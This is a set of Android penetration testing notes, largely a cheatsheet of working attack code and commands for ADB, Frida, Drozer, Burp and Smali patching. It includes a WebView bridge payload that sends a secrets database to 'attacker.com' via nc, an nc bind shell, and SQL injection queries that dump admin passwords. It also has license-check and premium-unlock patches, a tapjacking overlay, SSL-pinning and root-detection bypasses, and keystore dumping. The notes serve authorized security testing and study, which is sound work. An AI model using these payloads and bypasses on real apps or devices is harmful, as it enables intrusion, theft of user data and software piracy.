# 📱 Android Penetration Testing Notes

---

## 📑 Table of Contents

1. [Android Architecture Deep Dive](#android-architecture-deep-dive)
2. [Testing Environment Setup](#testing-environment-setup)
3. [ADB Red Teaming](#adb-red-teaming)
4. [Static Analysis - Reverse Engineering](#static-analysis---reverse-engineering)
5. [Dynamic Analysis - Runtime Manipulation](#dynamic-analysis---runtime-manipulation)
6. [Network Interception & MiTM](#network-interception--mitm)
7. [Exploitation Techniques](#exploitation-techniques)
8. [Root Detection & SSL Pinning Bypass](#root-detection--ssl-pinning-bypass)
9. [Data Extraction & Exfiltration](#data-extraction--exfiltration)
10. [Master Cheatsheet](#master-cheatsheet)

---

## Android Architecture Deep Dive

### The Attack Surface

```
┌─────────────────────────────────────┐
│    Application Layer (APKs)         │ ← Our Primary Target
├─────────────────────────────────────┤
│    Application Framework            │ ← Activity Manager, Package Manager
├─────────────────────────────────────┤
│    Android Runtime (ART/Dalvik)     │ ← DEX bytecode execution
├─────────────────────────────────────┤
│    Native Libraries (C/C++)         │ ← JNI, .so files
├─────────────────────────────────────┤
│    Linux Kernel                     │ ← Drivers, SELinux
└─────────────────────────────────────┘
```

### Critical Security Components

#### **Application Sandbox**
- Each app runs with unique Linux UID
- Process isolation via separate VMs
- File permissions: `0600` (owner RW only)
- **Exploit Angle:** Shared UID exploitation (`sharedUserId` in manifest)

#### **SELinux (Enforcing)**
```bash
# Check SELinux status
adb shell getenforce

# Common bypass: Check for permissive domains
adb shell "su -c 'sesearch --allow -s untrusted_app'"
```

#### **Verified Boot**
- Cryptographic chain from bootloader → kernel → system
- **Red Team Note:** On rooted devices, disable dm-verity:
```bash
adb root && adb disable-verity && adb reboot
```

---

## Testing Environment Setup

### Essential Toolkit

```bash
# Core Tools Installation (Kali/Parrot)
apt install -y android-tools-adb android-tools-fastboot
pip3 install frida-tools objection apkleaks

# APK Analysis Suite
wget https://github.com/iBotPeaches/Apktool/releases/latest/download/apktool_*.jar -O apktool.jar
wget https://github.com/skylot/jadx/releases/latest/download/jadx-*.zip && unzip jadx-*.zip

# Mobile Security Framework (MobSF)
docker pull opensecurity/mobile-security-framework-mobsf
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf
```

### Emulator for Pentest

**Genymotion with ARM Translation** (Recommended for production apps):
```bash
# Install ARM translation for running real-world apps
# Download ARM Translation zip from: https://github.com/m9rco/Genymotion_ARM_Translation
adb push Genymotion-ARM-Translation.zip /sdcard/
adb shell
su
cd /sdcard
unzip Genymotion-ARM-Translation.zip -d /system
reboot
```

**Android Studio AVD with Root**:
```bash
# Use AVD without Google Play (important for root)
emulator -avd Pixel_3a_API_30 -writable-system

# Root the emulator
adb root
adb remount
```

---

## ADB Red Teaming

### Port Forwarding & Reverse Shells

```bash
# Forward JDWP debugging port (for app debugging without USB)
adb forward tcp:8700 jdwp:$(adb shell pidof -s com.target.app)

# Reverse shell via ADB (requires root)
adb shell "su -c 'nc -lp 4444 -e /system/bin/sh'" &
nc <device_ip> 4444

# Port forward for Frida
adb forward tcp:27042 tcp:27042
```

### Data Exfiltration via ADB

```bash
# Pull entire app data directory (root required)
adb shell "su -c 'tar -czf /sdcard/app_data.tar.gz /data/data/com.target.app'"
adb pull /sdcard/app_data.tar.gz

# Exfiltrate databases
adb shell "su -c 'cp /data/data/com.target.app/databases/*.db /sdcard/'"
adb pull /sdcard/*.db

# Screenshot capture (no root)
adb shell screencap -p /sdcard/screen.png
adb pull /sdcard/screen.png

# Screen recording (Android 4.4+)
adb shell screenrecord /sdcard/demo.mp4
# Press Ctrl+C to stop, then pull
adb pull /sdcard/demo.mp4
```

### Process Injection via JDWP

```bash
# Find debuggable apps
adb shell "ps | grep 'u0_a' | awk '{print \$9}'"

# Get JDWP port for target process
adb jdwp

# Forward JDWP port
adb forward tcp:8700 jdwp:<PID>

# Attach with JDB and execute commands
jdb -attach localhost:8700
> threads
> suspend
# (Inject malicious code here via reflection)
```

### Logcat Weaponization

```bash
# Filter for passwords/tokens (common dev mistake)
adb logcat | grep -iE "password|token|secret|api_key|bearer"

# Monitor crypto operations
adb logcat | grep -i "crypto\|cipher\|encrypt"

# Detect root checks
adb logcat | grep -iE "root|supersu|magisk|xposed"

# Export filtered logs
adb logcat -d *:E > error_logs.txt  # Errors only
adb logcat -d | grep -i "sqlitedb" > db_operations.txt
```

---

## Static Analysis - Reverse Engineering

### APK Extraction & Decompilation

```bash
# Extract APK from device
adb shell pm list packages -f | grep <keyword>
adb pull /data/app/com.target.app-XXXX/base.apk target.apk

# Decompile with Apktool (for Smali + resources)
apktool d target.apk -o decompiled/

# Decompile to Java with JADX
jadx -d output/ target.apk
```

### Smali Patching for Exploitation

**Example: Bypass License Check**

Original Smali (`LicenseValidator.smali`):
```smali
.method public checkLicense()Z
    .locals 2
    
    invoke-static {}, Lcom/target/LicenseValidator;->verifyServer()Z
    move-result v0
    
    if-eqz v0, :cond_0
    const/4 v1, 0x1
    return v1
    
    :cond_0
    const/4 v1, 0x0
    return v1
.end method
```

Patched Smali (always return true):
```smali
.method public checkLicense()Z
    .locals 1
    
    const/4 v0, 0x1  # Force return true
    return v0
.end method
```

**Recompile & Sign**:
```bash
# Rebuild APK
apktool b decompiled/ -o modified.apk

# Sign with debug key
keytool -genkey -v -keystore debug.keystore -alias debugkey -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -keystore debug.keystore modified.apk debugkey

# Zipalign
zipalign -v 4 modified.apk aligned.apk

# Install
adb install -r aligned.apk
```

### Native Library (JNI) Analysis

```bash
# Extract .so files
unzip target.apk "lib/*" -d native_libs/

# Identify architecture
file native_libs/lib/armeabi-v7a/libnative.so

# Disassemble with Ghidra/IDA
# Look for JNI_OnLoad and native method implementations

# Strings extraction (quick intel)
strings native_libs/lib/arm64-v8a/libnative.so | grep -iE "http|key|password"
```

**Frida Hook for JNI Function**:
```javascript
// Hook native function via JNI
Java.perform(function() {
    var nativeLib = Process.getModuleByName("libnative.so");
    var nativeFunc = nativeLib.getExportByName("Java_com_target_Native_decrypt");
    
    Interceptor.attach(nativeFunc, {
        onEnter: function(args) {
            console.log("[+] Native decrypt called");
            console.log("    Input: " + Memory.readUtf8String(args[2]));
        },
        onLeave: function(retval) {
            var result = Memory.readUtf8String(retval);
            console.log("    Output: " + result);
        }
    });
});
```

### AndroidManifest.xml Exploitation Recon

```bash
# Extract manifest
aapt dump xmltree target.apk AndroidManifest.xml

# Key attack vectors to check:
# 1. Exported components without permissions
grep -E "exported=\"true\"" AndroidManifest.xml

# 2. Debuggable flag (enables JDWP)
grep "android:debuggable=\"true\"" AndroidManifest.xml

# 3. Backup allowed (enables ADB backup extraction)
grep "android:allowBackup=\"true\"" AndroidManifest.xml

# 4. Clear text traffic (no SSL enforcement)
grep "android:usesCleartextTraffic=\"true\"" AndroidManifest.xml
```

---

## Dynamic Analysis - Runtime Manipulation

### Frida Framework Mastery

**Installation**:
```bash
# Install Frida on host
pip3 install frida-tools

# Download Frida server for Android
wget https://github.com/frida/frida/releases/download/16.0.10/frida-server-16.0.10-android-arm64.xz
unxz frida-server-16.0.10-android-arm64.xz

# Push to device
adb push frida-server-16.0.10-android-arm64 /data/local/tmp/frida-server
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"
```

**Advanced Frida Scripts**

**1. SSL Pinning Bypass (Universal)**
```javascript
Java.perform(function() {
    // Hook OkHttp3
    var CertificatePinner = Java.use("okhttp3.CertificatePinner");
    CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
        console.log("[+] OkHttp3 SSL Pinning bypassed");
    };
    
    // Hook TrustManager
    var TrustManagerImpl = Java.use("com.android.org.conscrypt.TrustManagerImpl");
    TrustManagerImpl.verifyChain.implementation = function() {
        console.log("[+] TrustManager bypassed");
        return arguments[0]; // Return original cert chain
    };
    
    // Hook Apache HTTP Client
    var SSLContext = Java.use("javax.net.ssl.SSLContext");
    SSLContext.init.implementation = function() {
        console.log("[+] SSLContext.init bypassed");
    };
});
```

**2. Root Detection Bypass**
```javascript
Java.perform(function() {
    // Magisk detection
    var File = Java.use("java.io.File");
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        if (path.indexOf("magisk") !== -1 || 
            path.indexOf("su") !== -1 ||
            path === "/system/xbin/su") {
            console.log("[+] Hiding: " + path);
            return false;
        }
        return this.exists.call(this);
    };
    
    // Runtime.exec check
    var Runtime = Java.use("java.lang.Runtime");
    Runtime.exec.overload('[Ljava.lang.String;').implementation = function(cmd) {
        if (cmd[0] === "su") {
            console.log("[+] Blocked 'su' execution");
            throw new Error("Command not found");
        }
        return this.exec(cmd);
    };
    
    // Build.TAGS check
    var Build = Java.use("android.os.Build");
    Build.TAGS.value = "release-keys";
});
```

**3. Method Tracer (for Reverse Engineering Logic)**
```javascript
Java.perform(function() {
    var targetClass = Java.use("com.target.app.CryptoManager");
    
    targetClass.class.getDeclaredMethods().forEach(function(method) {
        var methodName = method.getName();
        var overloadCount = targetClass[methodName].overloads.length;
        
        for (var i = 0; i < overloadCount; i++) {
            targetClass[methodName].overloads[i].implementation = function() {
                console.log("[TRACE] " + methodName + " called");
                console.log("    Args: " + JSON.stringify(arguments));
                var retval = this[methodName].apply(this, arguments);
                console.log("    Return: " + retval);
                return retval;
            };
        }
    });
});
```

**4. Shared Preferences Dumper**
```javascript
Java.perform(function() {
    var SharedPrefs = Java.use("android.app.SharedPreferencesImpl");
    SharedPrefs.getString.implementation = function(key, defValue) {
        var value = this.getString(key, defValue);
        console.log("[SharedPrefs] " + key + " = " + value);
        return value;
    };
});
```

**Running Frida Scripts**:
```bash
# Attach to running app
frida -U -f com.target.app -l script.js --no-pause

# Spawn app with script
frida -U -n "Target App" -l script.js

# Use Objection (Frida wrapper)
objection -g com.target.app explore
```

### Drozer Framework

**Setup**:
```bash
# Install Drozer agent APK on device
adb install drozer-agent.apk

# Forward port
adb forward tcp:31415 tcp:31415

# Start Drozer console
drozer console connect
```

**Exploitation Commands**:

```bash
# Enumerate attack surface
run app.package.attacksurface com.target.app

# Find exported activities
run app.activity.info -a com.target.app -u

# Launch private activity (Intent spoofing)
run app.activity.start --component com.target.app com.target.app.PrivateActivity

# SQL Injection in Content Provider
run scanner.provider.injection -a com.target.app

# Path traversal
run scanner.provider.traversal -a com.target.app

# Extract data from Content Provider
run app.provider.query content://com.target.app.provider/users

# Broadcast Intent sniffing
run app.broadcast.sniff --action android.intent.action.BOOT_COMPLETED
```

---

## Network Interception & MiTM

### Burp Suite Configuration

**1. Certificate Installation (Android 7+)**

```bash
# Export Burp CA cert
# In Burp: Proxy > Options > Import/Export CA Certificate > Certificate in DER format

# Convert to PEM and rename
openssl x509 -inform DER -in cacert.der -out cacert.pem
openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1
# Output: 9a5ba575

mv cacert.pem 9a5ba575.0

# Push to system certs (root required)
adb root && adb remount
adb push 9a5ba575.0 /system/etc/security/cacerts/
adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0
adb reboot
```

**2. Proxy Setup**

```bash
# Configure device WiFi
# Manual proxy: <Host_IP>:8080

# Or use ProxyDroid app for global proxy (root required)

# Verify traffic
# Burp > Proxy > Intercept > Enable
```

**3. Bypassing Certificate Pinning with Frida (if not patched)**

```bash
# Use pre-built script
frida -U -f com.target.app -l fridascripts/universal-ssl-pinning-bypass.js --no-pause
```

### mitmproxy for Scriptable Interception

```bash
# Install
pip3 install mitmproxy

# Start with addon script
mitmproxy -s modify_response.py

# Example addon (modify_response.py)
```

```python
from mitmproxy import http

def response(flow: http.HTTPFlow) -> None:
    if "api.target.com" in flow.request.pretty_host:
        # Modify JSON response
        if flow.response.headers.get("content-type", "").startswith("application/json"):
            data = flow.response.json()
            data["isPremium"] = True  # Grant premium access
            flow.response.text = json.dumps(data)
```

---

## Exploitation Techniques

### 1. Content Provider Exploitation

**Identify Vulnerable Providers**:
```bash
# Drozer scan
run scanner.provider.finduris -a com.target.app

# Manual check in manifest
grep -A 5 "<provider" AndroidManifest.xml
```

**SQL Injection PoC**:
```bash
# Drozer
run app.provider.query content://com.target.app.provider/users --projection "* FROM sqlite_master WHERE type='table'--"

# ADB
adb shell content query --uri content://com.target.app.provider/users --projection "*) FROM users WHERE 1=1--"

# Frida (programmatic)
```
```javascript
Java.perform(function() {
    var Uri = Java.use("android.net.Uri");
    var ContentResolver = Java.use("android.content.ContentResolver");
    
    var uri = Uri.parse("content://com.target.app.provider/users");
    var resolver = Java.use("android.app.ActivityThread").currentApplication().getContentResolver();
    
    var cursor = resolver.query(uri, null, "1=1) UNION SELECT username, password FROM admin_users--", null, null);
    
    while (cursor.moveToNext()) {
        console.log(cursor.getString(0) + ":" + cursor.getString(1));
    }
});
```

### 2. Insecure Broadcast Receivers

**Exploit Unprotected Receiver**:
```bash
# Send malicious broadcast
adb shell am broadcast -a com.target.app.ACTION_PREMIUM -n com.target.app/.PremiumReceiver --es "unlock" "true"

# Frida script
```
```javascript
Java.perform(function() {
    var Intent = Java.use("android.content.Intent");
    var ActivityThread = Java.use("android.app.ActivityThread");
    
    var intent = Intent.$new("com.target.app.ACTION_PREMIUM");
    intent.putExtra("unlock", "true");
    
    ActivityThread.currentApplication().sendBroadcast(intent);
    console.log("[+] Malicious broadcast sent");
});
```

### 3. Tapjacking Attack

**Malicious Overlay App (PoC)**:
```xml
<!-- AndroidManifest.xml -->
<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>

<service android:name=".OverlayService" android:exported="false"/>
```

```java
// OverlayService.java
public class OverlayService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        
        View overlayView = new View(this);
        overlayView.setBackgroundColor(Color.TRANSPARENT);
        overlayView.setOnTouchListener((v, event) -> {
            // Log touch coordinates (steal taps)
            Log.d("TAPJACK", "X: " + event.getX() + " Y: " + event.getY());
            return false; // Pass through to victim app
        });
        
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        );
        
        wm.addView(overlayView, params);
        return START_STICKY;
    }
}
```

**Defense Check**:
```java
// Victim app should use
view.setFilterTouchesWhenObscured(true);
```

### 4. WebView Exploitation

**Check for Vulnerable WebView**:
```bash
grep -r "setJavaScriptEnabled(true)" decompiled/
grep -r "addJavascriptInterface" decompiled/
```

**XSS to RCE via JavaScript Bridge**:
```javascript
// If app exposes Java object to JS
webView.addJavascriptInterface(new JavaScriptInterface(), "Android");

// Exploitation payload
<script>
  Android.getClass().forName('java.lang.Runtime')
    .getMethod('getRuntime',null)
    .invoke(null,null)
    .exec(['sh','-c','cat /data/data/com.target.app/databases/secrets.db | nc attacker.com 4444']);
</script>
```

---

## Root Detection & SSL Pinning Bypass

### Root Detection Methods & Bypasses

**Common Checks**:
1. **File existence**: `/system/app/Superuser.apk`, `/system/xbin/su`
2. **Build tags**: `test-keys` vs `release-keys`
3. **Running processes**: `ps | grep magisk`
4. **Package manager**: `pm list packages | grep supersu`

**Universal Bypass with Magisk Hide**:
```bash
# Enable MagiskHide for target app
adb shell su -c 'magiskhide enable'
adb shell su -c 'magiskhide add com.target.app'
```

**Frida Script (see Dynamic Analysis section)**

**Manual Smali Patch**:
```smali
# Find root check method
.method public isRooted()Z
    # ... checks ...
    const/4 v0, 0x1  # Returns true if rooted
    return v0
.end method

# Patch to always return false
.method public isRooted()Z
    const/4 v0, 0x0
    return v0
.end method
```

### SSL Pinning Bypass

**1. Using Magisk Module**:
```bash
# Install TrustMeAlready module
# Download from: https://github.com/ViRb3/TrustMeAlready/releases
adb push TrustMeAlready.zip /sdcard/
# Flash via Magisk Manager
```

**2. Objection (Automated)**:
```bash
objection -g com.target.app explore
android sslpinning disable
```

**3. Manual Frida (see Network Interception section)**

**4. Xposed Module**:
- Install JustTrustMe or SSLUnpinning module
- Enable for target app
- Reboot

---

## Data Extraction & Exfiltration

### Database Extraction

```bash
# Root method
adb shell "su -c 'cp -r /data/data/com.target.app/databases /sdcard/'"
adb pull /sdcard/databases

# Non-root (if backup allowed)
adb backup -f backup.ab -noapk com.target.app
dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar
tar -xvf backup.tar

# SQLite analysis
sqlite3 user_data.db
.tables
.schema users
SELECT * FROM users WHERE role='admin';
```

### Shared Preferences Extraction

```bash
# Root method
adb shell "su -c 'cat /data/data/com.target.app/shared_prefs/*.xml'"

# Frida dumper
```
```javascript
Java.perform(function() {
    var ctx = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext();
    var prefs = ctx.getSharedPreferences("user_prefs", 0);
    var allEntries = prefs.getAll();
    
    var entries = allEntries.entrySet();
    var iterator = entries.iterator();
    
    while (iterator.hasNext()) {
        var entry = iterator.next();
        console.log(entry.getKey() + " = " + entry.getValue());
    }
});
```

### Keychain/Keystore Extraction

```bash
# Dump keystore (root required)
adb shell "su -c 'cat /data/misc/keystore/user_0/*' | base64" | base64 -d > keystore.bin

# Use keychain_dumper
adb push keychain_dumper /data/local/tmp/
adb shell "su -c 'chmod 755 /data/local/tmp/keychain_dumper'"
adb shell "su -c '/data/local/tmp/keychain_dumper'"
```

### Screenshot & Screen Recording

```bash
# Automated screenshot loop
while true; do
  adb shell screencap -p /sdcard/screen_$(date +%s).png
  sleep 5
done

# Pull all screenshots
adb pull /sdcard/screen_*.png screenshots/

# Screen recording with Frida (programmatic)
```
```javascript
Java.perform(function() {
    var MediaRecorder = Java.use("android.media.MediaRecorder");
    var File = Java.use("java.io.File");
    
    var recorder = MediaRecorder.$new();
    recorder.setVideoSource(MediaRecorder.VideoSource.SURFACE.value);
    recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4.value);
    recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264.value);
    recorder.setOutputFile(File.$new("/sdcard/recording.mp4").getAbsolutePath());
    recorder.prepare();
    recorder.start();
    
    console.log("[+] Recording started");
});
```

---

## Master Cheatsheet

### Quick Reference Commands

#### ADB Essentials
```bash
# Device connection
adb devices
adb connect <IP>:5555
adb -s <device_id> shell

# Root & remount
adb root
adb remount

# Package management
adb shell pm list packages | grep <keyword>
adb shell pm path <package>
adb pull <path_to_apk>
adb install -r <apk>
adb uninstall <package>

# Process inspection
adb shell ps | grep <package>
adb shell pidof <package>
adb shell cat /proc/<PID>/maps

# Port forwarding
adb forward tcp:<local_port> tcp:<remote_port>
adb reverse tcp:<remote_port> tcp:<local_port>
```

#### APK Analysis
```bash
# Decompile
apktool d app.apk -o output/
jadx -d output/ app.apk

# Recompile & sign
apktool b output/ -o modified.apk
jarsigner -keystore debug.keystore modified.apk alias
zipalign -v 4 modified.apk aligned.apk

# Manifest analysis
aapt dump badging app.apk
aapt dump permissions app.apk
aapt dump xmltree app.apk AndroidManifest.xml

# Strings extraction
strings classes.dex | grep -iE "http|api|key|password"
```

#### Frida One-Liners
```bash
# List processes
frida-ps -U

# Spawn with script
frida -U -f <package> -l script.js --no-pause

# Attach to running
frida -U -n "<app_name>" -l script.js

# Interactive REPL
frida -U <package>

# Objection shortcuts
objection -g <package> explore
> android hooking list activities
> android hooking list services
> android intent launch_activity <activity>
> android sslpinning disable
> memory dump all <output_file>
```

#### Drozer Exploitation
```bash
# Attack surface
run app.package.attacksurface <package>

# Activities
run app.activity.info -a <package>
run app.activity.start --component <package> <activity>

# Services
run app.service.info -a <package>
run app.service.start --component <package> <service>

# Content Providers
run app.provider.info -a <package>
run app.provider.query <content_uri>
run scanner.provider.injection -a <package>
run scanner.provider.traversal -a <package>

# Broadcast Receivers
run app.broadcast.info -a <package>
run app.broadcast.send --action <action> --extra string <key> <value>
```

#### Cryptography Analysis
```bash
# Check crypto implementation
grep -r "Cipher\.getInstance" decompiled/
grep -r "MessageDigest" decompiled/
grep -r "SecureRandom" decompiled/

# Common weak patterns
grep -r "AES/ECB" decompiled/  # Bad: No IV
grep -r "DES" decompiled/       # Bad: Weak algo
grep -r "MD5\|SHA1" decompiled/ # Bad: For passwords
```

#### Network Interception
```bash
# Burp certificate
openssl x509 -inform DER -in burp.der -out burp.pem
subject_hash=$(openssl x509 -inform PEM -subject_hash_old -in burp.pem | head -1)
cat burp.pem > ${subject_hash}.0
adb push ${subject_hash}.0 /system/etc/security/cacerts/

# Proxy setup
adb shell settings put global http_proxy <IP>:8080
adb shell settings delete global http_proxy  # Remove

# Traffic capture
tcpdump -i any -w capture.pcap
adb shell "tcpdump -s0 -w - | nc -l -p 4444" &
adb forward tcp:4444 tcp:4444
nc localhost 4444 | wireshark -k -i -
```

### Frida Script Snippets Library

#### Hook Constructor
```javascript
Java.perform(function() {
    var TargetClass = Java.use("com.target.ClassName");
    TargetClass.$init.implementation = function() {
        console.log("[+] Constructor called");
        return this.$init.apply(this, arguments);
    };
});
```

#### Intercept Method & Modify Return
```javascript
Java.perform(function() {
    var TargetClass = Java.use("com.target.ClassName");
    TargetClass.methodName.implementation = function(arg1) {
        console.log("[+] Called with: " + arg1);
        var result = this.methodName(arg1);
        console.log("[+] Original return: " + result);
        return "MODIFIED_VALUE";  // Change return value
    };
});
```

#### Enumerate Loaded Classes
```javascript
Java.perform(function() {
    Java.enumerateLoadedClasses({
        onMatch: function(className) {
            if (className.indexOf("com.target") !== -1) {
                console.log(className);
            }
        },
        onComplete: function() {}
    });
});
```

#### Dump Class Methods
```javascript
Java.perform(function() {
    var TargetClass = Java.use("com.target.ClassName");
    var methods = TargetClass.class.getDeclaredMethods();
    methods.forEach(function(method) {
        console.log(method.getName());
    });
});
```

#### Hook All Overloads
```javascript
Java.perform(function() {
    var TargetClass = Java.use("com.target.ClassName");
    var overloads = TargetClass.methodName.overloads;
    
    overloads.forEach(function(overload) {
        overload.implementation = function() {
            console.log("[+] Method called with " + arguments.length + " args");
            return this.methodName.apply(this, arguments);
        };
    });
});
```

#### Call Static Method
```javascript
Java.perform(function() {
    var TargetClass = Java.use("com.target.ClassName");
    var result = TargetClass.staticMethod("arg1", "arg2");
    console.log("[+] Result: " + result);
});
```

#### Instantiate & Call Instance Method
```javascript
Java.perform(function() {
    var TargetClass = Java.use("com.target.ClassName");
    var instance = TargetClass.$new();  // Call constructor
    var result = instance.instanceMethod("arg");
    console.log("[+] Result: " + result);
});
```

#### Monitor File Operations
```javascript
Java.perform(function() {
    var FileInputStream = Java.use("java.io.FileInputStream");
    FileInputStream.$init.overload('java.lang.String').implementation = function(path) {
        console.log("[FILE READ] " + path);
        return this.$init(path);
    };
    
    var FileOutputStream = Java.use("java.io.FileOutputStream");
    FileOutputStream.$init.overload('java.lang.String').implementation = function(path) {
        console.log("[FILE WRITE] " + path);
        return this.$init(path);
    };
});
```

#### Bypass Flag Checks
```javascript
Java.perform(function() {
    var Activity = Java.use("android.app.Activity");
    Activity.isTaskRoot.implementation = function() {
        return true;  // Bypass detection of running under another task
    };
    
    var Debug = Java.use("android.os.Debug");
    Debug.isDebuggerConnected.implementation = function() {
        return false;  // Hide debugger
    };
});
```

---

## Final Notes

### Recommended Lab Setup
1. **Physical Device**: Rooted Pixel 3a (Magisk + EdXposed)
2. **Emulator**: Genymotion with ARM translation
3. **Host OS**: Kali Linux (or Parrot Security)
4. **Network**: Isolated lab network with controlled internet access

### Continuous Learning Resources
- **OWASP MSTG**: https://github.com/OWASP/owasp-mstg
- **Frida CodeShare**: https://codeshare.frida.re/
- **Android Security Bulletin**: https://source.android.com/security/bulletin
- **XDA Developers**: https://www.xda-developers.com/

### Legal & Ethical Considerations
⚠️ **WARNING**: All techniques documented here are for authorized security testing only.
- Always obtain written permission before testing
- Respect scope boundaries
- Follow responsible disclosure practices
- Never weaponize for malicious purposes
